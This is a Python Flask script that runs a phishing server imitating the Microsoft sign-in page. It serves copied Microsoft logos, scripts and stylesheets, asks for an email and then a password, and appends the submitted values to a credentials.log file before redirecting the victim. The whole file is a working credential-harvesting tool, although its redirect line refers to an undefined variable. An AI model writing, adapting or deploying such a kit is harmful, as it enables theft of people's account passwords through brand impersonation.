from flask import Flask, request, render_template, send_file, redirect
from sys import argv
import os

app = Flask(__name__)


redirect_url = argv[1]
host = argv[2]
port = int(argv[3])


@app.route("/")
def email():
    return render_template("email.html")


@app.route("/", methods=["POST"])
def passwd():
    data = request.form.to_dict(flat=False)
    return render_template("password.html", email=data["loginfmt"][0])


@app.route("/login.php", methods=["POST", "GET"])
def grabcreds():
    data = request.form.to_dict(flat=False)
    with open("credentials.log", "a") as file:
        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
    return redirect(url)



@app.route("/sprites/microsoft_logo.svg")
def Logo1():
    return send_file(os.path.join("templates", "sprites", "microsoft_logo.svg"))   


@app.route("/sprites/icon_key.svg")
def Logo2():
    return send_file(os.path.join("templates", "sprites", "icon_key.svg"))


@app.route("/index_files/ConvergedLoginPaginatedStrings.EN.js")
def JS_1():
    return send_file(os.path.join("templates", "index_files", "ConvergedLoginPaginatedStrings.EN.js"))


@app.route("/index_files/Converged_v21033.css")
def CSS():
    return send_file(os.path.join("templates", "index_files", "Converged_v21033.css"))


@app.route("/index_files/ConvergedLogin_PCore.js")
def JS_2():
    return send_file(os.path.join("templates", "index_files", "ConvergedLogin_PCore.js"))


@app.route("/sprites/ellipsis_white.svg")
def Logo3():
    return send_file(os.path.join("templates", "sprites", "ellipsis_white.svg"))


@app.route("/sprites/ellipsis_grey.svg")    
def Logo4():
    return send_file(os.path.join("templates", "sprites", "ellipsis_grey.svg"))


app.run(host=host, port=port)  